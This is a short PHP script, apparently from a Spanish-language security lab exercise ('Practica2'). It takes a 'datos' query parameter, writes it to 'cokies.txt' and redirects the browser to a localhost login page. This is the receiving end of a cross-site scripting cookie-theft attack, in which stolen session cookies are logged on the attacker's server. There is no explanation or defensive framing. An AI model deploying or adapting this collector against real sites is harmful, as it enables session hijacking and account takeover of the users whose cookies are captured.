<?php

	$file = fopen ("cokies.txt", "w");
	$info = $_GET['datos'];
	fwrite ($file, $info);
	fclose ($file);
	header ("Location: http://localhost:8890/Practica2/login.php");
?>